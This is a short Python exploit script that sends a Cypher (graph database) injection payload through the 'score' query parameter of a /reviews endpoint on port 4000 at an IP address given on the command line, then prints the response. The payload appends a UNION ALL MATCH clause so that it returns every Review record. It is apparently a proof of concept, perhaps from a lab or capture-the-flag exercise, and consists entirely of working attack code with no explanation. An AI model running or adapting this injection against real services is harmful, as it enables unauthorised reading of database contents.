#!/usr/bin/env python3

import sys
import requests

IP = sys.argv[1]

payload = '3 RETURN r LIMIT 1 UNION ALL MATCH (r:Review)'
host = f'http://{IP}:4000/reviews'


resp = requests.get(host, params={'score': payload})

print(resp.text)



